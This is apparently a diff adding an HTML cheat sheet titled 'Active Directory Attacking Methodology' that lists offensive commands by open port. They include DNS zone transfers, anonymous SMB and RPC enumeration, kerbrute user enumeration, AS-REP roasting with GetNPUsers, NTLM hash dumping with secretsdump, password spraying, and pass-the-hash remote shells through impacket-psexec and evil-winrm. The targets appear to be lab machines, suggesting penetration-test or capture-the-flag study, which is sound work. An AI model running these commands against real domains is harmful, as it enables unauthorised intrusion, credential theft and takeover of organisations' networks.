@@ -1,0 +1,57 @@
+<p><strong><span style="font-size: 28px; background-color: rgb(65, 168, 95);">Active Directory Attacking Methodology</span></strong></p>
+<p><br></p>
+<p><span style="font-size: 22px;"><strong><span style="background-color: rgb(84, 172, 210);">Website for help:</span></strong>&nbsp;</span><a href="https://wadcoms.github.io/"><span style="font-size: 30px;">https://wadcoms.github.io/</span></a></p>
+<p><span style="font-size: 26px;"><span style="background-color: rgb(251, 160, 38);"><strong>Detailed Information</strong>:</span> <a href="https://navkang.github.io/Doozy/winprivesc2.html">https://navkang.github.io/Doozy/winprivesc2.html</a></span></p>
+<p><span style="font-size: 30px; color: rgb(65, 168, 95);">-------------------------------------------------------------------------------------</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica; color: rgb(85, 57, 130);"><strong>Port 53 open: (zone transfer)</strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica; color: rgb(0, 0, 0);">dig axfr @10.10.10.10 local.htb</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica; color: rgb(0, 0, 0);">dig axfr @ 10.10.10.10 local-bank.local</span></p>
+<p><span style="font-size: 30px; color: rgb(65, 168, 95);"><strong>-------------------------------------------------------------------------------------</strong></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; color: rgb(184, 49, 47);"><strong>Ports 135,139 and 445 open: (shares, comp and domain info, users)</strong></span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica;">smbclient -L \\\\&lt;ip&gt;\\</span></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">smbclient \\\\IP address\sharename\</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">smbclient -U &lt;username&gt; \\\\ ip \sharename</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica; color: rgb(243, 121, 52);">-----------------------------------------------------------</span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica;">smbmap -H &lt;ip&gt;</span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica;">smbmap -u user -p pass -H &lt;ipadd&gt;</span></span></p>
+<p><span style="font-size: 18px;">(also try with &quot;&quot; instead of user and pass)</span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica; color: rgb(251, 160, 38);">-----------------------------------------------------------</span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica;">rpcclient -U &quot;&quot; IPadd</span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - enumdomusers</span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - enumdomgroups</span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - queryuser &lt;RID&gt;</span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica; color: rgb(251, 160, 38);">----------------------------------------------------------</span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica;">crackmapexec smb &lt;ipadd&gt; -u &quot; -p &quot;</span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 30px; font-family: Helvetica; color: rgb(65, 168, 95);">-------------------------------------------------------------------------------------</span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica; color: rgb(243, 121, 52);"><strong>Port 389 open: (domain and users information)</strong></span></span></p>
+<p><span style="font-size: 28px;"><span style="font-size: 22px; font-family: Helvetica; color: rgb(0, 0, 0);">LDAPsearch<font color="#f37934"><strong>:</strong></font></span></span></p>
+<p><span style="text-align: inherit; font-size: 22px;">ldapsearch -x -h 10.10.10.175 -s base namingcontexts (then when you have the domain)</span></p>
+<p><span style="text-align: inherit; font-size: 22px;">ldapsearch -x -h 10.10.10.175 -b &apos;DC=EGOTISTICAL-BANK,DC=LOCAL&apos;</span></p>
+<p><span style="font-size: 30px; color: rgb(65, 168, 95);">-------------------------------------------------------------------------------------</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica; color: rgb(65, 168, 95);"><strong>Kerberos port 88 open: (spraying for valid usernames)</strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica; color: rgb(0, 0, 0);">kerbrute userenum -d test.local &lt;username list&gt; --dc &lt;ip add&gt;</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica; color: rgb(0, 0, 0);">kerbrute userenum -d test.local &lt;username list&gt;</span></p>
+<p><span style="font-size: 30px; font-family: Helvetica; color: rgb(65, 168, 95);">-------------------------------------------------------------------------------------</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica; color: rgb(0, 0, 0);"><strong><span style="background-color: rgb(226, 80, 65);">Others tools &amp; purpose:</span></strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica; color: rgb(0, 0, 0);"><strong>GetNPusers.py (look for vulnerable users - needs valid username list)</strong></span></p>
+<p><span style="font-family: Helvetica; font-size: 22px; text-align: inherit;">python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt</span></p>
+<p><span style="font-family: Helvetica; font-size: 22px; text-align: inherit; color: rgb(251, 160, 38);">-----------------------------------------------------------</span></p>
+<p><span style="font-family: Helvetica; font-size: 22px; text-align: inherit;"><strong>Secretsdump.py (dump hashes)</strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">secretsdump.py -just-dc-ntlm &lt;domain/username&gt;@&lt;ipadd&gt;</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;"><span style="color: rgb(251, 160, 38);">----------------------------------------------------------</span></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;"><span style="color: rgb(0, 0, 0);"><strong>password spraying:</strong></span></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;"><span style="color: rgb(0, 0, 0);">crackmapexec smb &lt;ipadd&gt; -u user.list -p password --continue-on-success</span><br></span></p>
+<p><span style="font-family: Helvetica; font-size: 22px; text-align: inherit; color: rgb(65, 168, 95);">---------------------------------------------------------------------------------------------------------------------</span></p>
+<p><span style="font-family: Helvetica; font-size: 22px; text-align: inherit; background-color: rgb(250, 197, 28);"><strong>Connecting tools:</strong></span></p>
+<p><span style="background-color: rgb(255, 255, 255); font-size: 22px; font-family: Helvetica;"><strong>PSEXEC:</strong></span></p>
+<p><span style="background-color: rgb(255, 255, 255); font-size: 22px; font-family: Helvetica;">impacket-psexec username:password@ipadd</span></p>
+<p><span style="background-color: rgb(255, 255, 255); font-size: 22px; font-family: Helvetica;">impacket-psexec administrator@ipadd -hashes : &lt;2nd part of hash&gt;</span></p>
+<p><span style="color: rgb(251, 160, 38); font-size: 22px;">------------------------------------------------------------</span></p>
+<p><span style="background-color: rgb(255, 255, 255); font-size: 22px; font-family: Helvetica;"><strong>EVIL-WINRM:</strong></span></p>
+<p><span style="background-color: rgb(255, 255, 255); font-size: 22px; font-family: Helvetica;">evil-winrm -i &lt;ip add&gt; -u user -p pass</span></p>
+<p><span style="background-color: rgb(255, 255, 255); font-size: 22px; font-family: Helvetica; color: rgb(251, 160, 38);">-----------------------------------------------------------</span></p>
+<p><span style="background-color: rgb(255, 255, 255); font-size: 22px; font-family: Helvetica;"><strong>CRACKMAPEXEC:</strong></span></p>
+<p><span style="background-color: rgb(255, 255, 255); font-size: 22px; font-family: Helvetica;">crackmapexec smb 10.129.79.75 -u user -p pass</span></p>
+<p><span style="background-color: rgb(255, 255, 255); font-size: 22px; font-family: Helvetica;">(there are other options so winrm can be used instead of smb)</span></p>
+<p><br></p>
+<p><br></p>
